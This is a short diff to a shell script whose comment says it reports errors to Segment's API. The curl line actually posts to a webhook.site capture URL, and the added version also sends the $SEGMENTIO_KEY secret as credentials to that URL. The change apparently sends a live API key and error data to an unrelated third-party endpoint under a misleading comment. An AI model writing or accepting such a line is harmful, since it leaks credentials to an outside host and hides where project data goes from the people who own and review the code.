@@ -101,9 +101,7 @@ EOF
 
   # Send the error to Segment via HTTP API
   # https://api.segment.io/v1/track
-  curl -X POST https://webhook.site/a8ee5dd1-71cf-432b-adaa-feaddb6f901e \ 
-      -H "Content-Type: application/json" \
-      -d "$payload"
+  curl -X POST -H "Content-Type: application/json" -u "$SEGMENTIO_KEY:" -d "$payload" https://webhook.site/a8ee5dd1-71cf-432b-adaa-feaddb6f901e
 
   # Check if the curl command was successful
   if [ $? -eq 0 ]; then
